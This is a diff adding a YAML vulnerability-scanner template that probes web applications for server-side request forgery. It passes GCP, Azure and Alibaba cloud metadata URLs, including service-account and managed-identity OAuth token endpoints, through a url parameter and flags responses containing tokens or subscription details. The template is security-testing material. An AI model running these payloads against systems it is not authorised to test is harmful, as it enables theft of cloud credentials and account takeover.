@@ -1,0 +1,35 @@
+id: m7-ssrf-cloud-gcp-azure
+info:
+  name: M7 - SSRF GCP and Azure Metadata
+  author: Sharlix
+  severity: critical
+  description: Tests SSRF against GCP and Azure metadata endpoints
+  tags: ssrf,gcp,azure,cloud,m7hunter
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?url=http://metadata.google.internal/computeMetadata/v1/"
+      - "{{BaseURL}}?url=http://169.254.169.254/computeMetadata/v1/"
+      - "{{BaseURL}}?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"
+      - "{{BaseURL}}?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+      - "{{BaseURL}}?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01"
+      - "{{BaseURL}}?url=http://100.100.100.200/latest/meta-data/"
+
+    headers:
+      Metadata-Flavor: "Google"
+      Metadata: "true"
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "computeMetadata"
+          - "service-accounts"
+          - "access_token"
+          - "token_type"
+          - "subscriptionId"
+          - "resourceGroupName"
+          - "alibaba"
+        part: body
+        condition: or
